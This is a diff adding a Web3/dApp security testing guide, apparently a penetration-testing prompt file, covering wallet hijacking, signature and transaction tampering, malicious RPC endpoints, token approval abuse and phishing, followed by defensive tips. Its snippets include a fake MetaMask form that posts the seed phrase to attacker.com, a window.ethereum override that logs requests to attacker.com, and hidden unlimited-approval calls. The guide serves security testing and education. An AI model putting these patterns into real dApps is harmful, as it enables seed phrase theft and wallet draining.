@@ -1,0 +1,281 @@
+<web3_dapp_security_guide>
+<title>WEB3/DAPP SECURITY</title>
+
+<critical>Web3 dApps interact with blockchain via frontend code, creating unique attack surface. Focus on wallet connection hijacking, transaction simulation, signature request manipulation, frontend contract interaction, RPC endpoint security, and MetaMask/wallet phishing. Frontend is untrusted but controls transaction construction.</critical>
+
+<scope>
+- Wallet connection hijacking (MetaMask, WalletConnect)
+- Transaction simulation and parameter manipulation
+- Signature request manipulation (EIP-191, EIP-712)
+- Frontend contract interaction vulnerabilities
+- RPC endpoint security and manipulation
+- Wallet phishing patterns
+- Smart contract call injection from frontend
+- Gas price manipulation
+- Token approval abuse
+</scope>
+
+<methodology>
+1. Inspect frontend: JavaScript bundles, Web3/Ethers.js usage
+2. Monitor wallet interactions: connection, transactions, signatures
+3. Test transaction manipulation: to, value, data parameters
+4. Test signature requests: message manipulation
+5. Test RPC endpoints: direct interaction, manipulation
+6. Test contract calls: function selectors, parameter encoding
+7. Test wallet phishing: fake connection popups
+8. Test token approvals: unlimited allowances
+</methodology>
+
+<wallet_connection_hijacking>
+<fake_connection>
+// Malicious dApp
+window.ethereum = {
+    request: async ({method, params}) => {
+        if (method === 'eth_requestAccounts') {
+            // Return fake address
+            return ['0xFakeAddress...'];
+        }
+        // Log all requests to attacker
+        fetch('http://attacker.com/log', {
+            method: 'POST',
+            body: JSON.stringify({method, params})
+        });
+    }
+};
+
+// Real MetaMask overwritten
+</fake_connection>
+
+<connection_phishing>
+// Fake MetaMask popup
+<div id="fake-metamask">
+    <h3>MetaMask</h3>
+    <p>Enter seed phrase to connect</p>
+    <input type="text" id="seed">
+    <button onclick="stealSeed()">Connect</button>
+</div>
+
+function stealSeed() {
+    const seed = document.getElementById('seed').value;
+    fetch('http://attacker.com/steal', {body: seed});
+}
+</connection_phishing>
+</wallet_connection_hijacking>
+
+<transaction_manipulation>
+<parameter_tampering>
+// Frontend shows: send 1 ETH to charity
+// But constructs: send 100 ETH to attacker
+
+const tx = {
+    to: '0xAttacker...',  // not charity address
+    value: ethers.utils.parseEther('100'),  // not 1 ETH
+    data: '0x...'  // malicious contract call
+};
+
+await signer.sendTransaction(tx);
+</parameter_tampering>
+
+<hidden_transactions>
+// Legitimate transaction + hidden malicious
+async function donate() {
+    // Show this
+    await sendDonation();
+    
+    // Hide this
+    await approveUnlimitedTokens();
+    await transferAllNFTs();
+}
+</hidden_transactions>
+</transaction_manipulation>
+
+<signature_request_manipulation>
+<eip712_abuse>
+// EIP-712 typed data signing
+const domain = {
+    name: 'Legitimate Service',
+    version: '1',
+    chainId: 1,
+    verifyingContract: '0xLegit...'
+};
+
+const types = {
+    Transfer: [
+        {name: 'to', type: 'address'},
+        {name: 'amount', type: 'uint256'}
+    ]
+};
+
+const value = {
+    to: '0xAttacker...',  // attacker address, not shown clearly
+    amount: '1000000000000000000000'  // 1000 tokens, shown as "1"
+};
+
+// User signs, thinking transferring 1 token
+const signature = await signer._signTypedData(domain, types, value);
+</eip712_abuse>
+
+<message_injection>
+// Simple signature (EIP-191)
+const message = "Login to app";  // shown
+const actualMessage = "Transfer ownership to 0xAttacker";  // signed
+
+const signature = await signer.signMessage(actualMessage);
+</message_injection>
+</signature_request_manipulation>
+
+<rpc_endpoint_abuse>
+<malicious_rpc>
+// dApp specifies RPC endpoint
+const provider = new ethers.providers.JsonRpcProvider('http://attacker.com/rpc');
+
+// All blockchain data from attacker
+// Can show fake balances, transactions, contract state
+</malicious_rpc>
+
+<rpc_man_in_middle>
+// Intercept and modify RPC responses
+await provider.send('eth_call', [
+    {
+        to: contractAddress,
+        data: functionSelector
+    },
+    'latest'
+]);
+
+// Attacker RPC returns fake data
+// Shows fake token balance: 1000 (real: 0)
+</rpc_man_in_middle>
+</rpc_endpoint_abuse>
+
+<contract_call_injection>
+<function_selector_manipulation>
+// Frontend should call: transfer(address,uint256)
+// Selector: 0xa9059cbb
+
+// Malicious: call transferFrom(address,address,uint256)
+// Selector: 0x23b872dd
+
+const data = ethers.utils.defaultAbiCoder.encode(
+    ['address', 'address', 'uint256'],
+    [victimAddress, attackerAddress, amount]
+);
+
+const tx = {
+    to: tokenContract,
+    data: '0x23b872dd' + data.slice(2)  // wrong function
+};
+</function_selector_manipulation>
+
+<parameter_encoding>
+// Encode malicious parameters
+const encoded = ethers.utils.defaultAbiCoder.encode(
+    ['address', 'uint256'],
+    ['0xAttacker...', ethers.utils.parseEther('1000')]
+);
+
+// Claim: sending 1 token
+// Reality: sending 1000 tokens
+</parameter_encoding>
+</contract_call_injection>
+
+<token_approval_abuse>
+<unlimited_approval>
+// Request unlimited token approval
+const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+await tokenContract.approve(spenderAddress, maxUint256);
+
+// Spender can drain all tokens anytime
+</unlimited_approval>
+
+<multiple_approvals>
+// Legitimate approval for dApp
+await token1.approve(dapp, amount);
+
+// Hidden malicious approval
+await token2.approve(attackerContract, maxUint256);
+await nft.setApprovalForAll(attackerContract, true);
+</multiple_approvals>
+</token_approval_abuse>
+
+<gas_manipulation>
+<high_gas_price>
+// Set extremely high gas price
+const tx = {
+    to: recipient,
+    value: smallAmount,
+    gasPrice: ethers.utils.parseUnits('1000', 'gwei')  // 1000 gwei
+};
+
+// User pays massive gas fee for tiny transfer
+</high_gas_price>
+
+<gas_estimation_manipulation>
+// Override gas estimation
+const estimatedGas = await contract.estimateGas.function();
+
+// Frontend shows: $5 gas fee
+// Reality: $500 gas fee (manipulated estimate)
+</gas_estimation_manipulation>
+</gas_manipulation>
+
+<phishing_patterns>
+<fake_wallet>
+// "Install MetaMask" link to fake extension
+<a href="chrome://extensions/fake-metamask.crx">
+    <img src="metamask-logo.png">
+    Install MetaMask
+</a>
+
+// Fake extension steals seed phrases
+</fake_wallet>
+
+<urgent_scarcity>
+// Social engineering
+"⚠️ URGENT: Your wallet will be locked in 5 minutes!"
+"🔥 Limited NFT drop: Only 10 remaining!"
+"💰 Claim your airdrop NOW or lose it!"
+
+// Pressure users to sign without reviewing
+</urgent_scarcity>
+</phishing_patterns>
+
+<validation>
+1. Inspect JavaScript: Web3.js, Ethers.js usage
+2. Monitor wallet: transactions, signatures, approvals
+3. Test transaction parameters: to, value, data fields
+4. Test signature requests: EIP-712 domain, types, values
+5. Check RPC endpoint: where blockchain data comes from
+6. Test contract calls: function selectors, encoded parameters
+7. Review approvals: unlimited allowances, hidden approvals
+8. Demonstrate impact: fund theft, NFT theft, unlimited token approval
+</validation>
+
+<impact>
+- Wallet draining (malicious transactions)
+- Signature abuse (ownership transfer)
+- Unlimited token approvals (future theft)
+- NFT theft
+- Seed phrase theft (phishing)
+- Gas fee manipulation (financial loss)
+- Fake transaction simulation
+</impact>
+
+<pro_tips>
+1. Always verify transaction parameters in wallet popup
+2. Check contract address is correct (not similar-looking)
+3. Reject unlimited token approvals—use exact amounts
+4. Verify RPC endpoint is legitimate (not attacker-controlled)
+5. Never enter seed phrase on any website
+6. Check domain carefully—many phishing sites (metαmask.com)
+7. Simulate transactions on Tenderly/BlockScout before signing
+8. Use hardware wallet for large holdings
+9. Review function selector in transaction data
+10. Check gas price is reasonable
+11. Revoke unused token approvals regularly
+12. Browser extension phishing very common—verify extension ID
+</pro_tips>
+
+<remember>Web3 frontend is untrusted—controls transaction construction, RPC endpoints, and presentation. Always verify transaction parameters in wallet, reject unlimited approvals, and never trust frontend-displayed information. Hardware wallets provide transaction signing verification.</remember>
+</web3_dapp_security_guide>
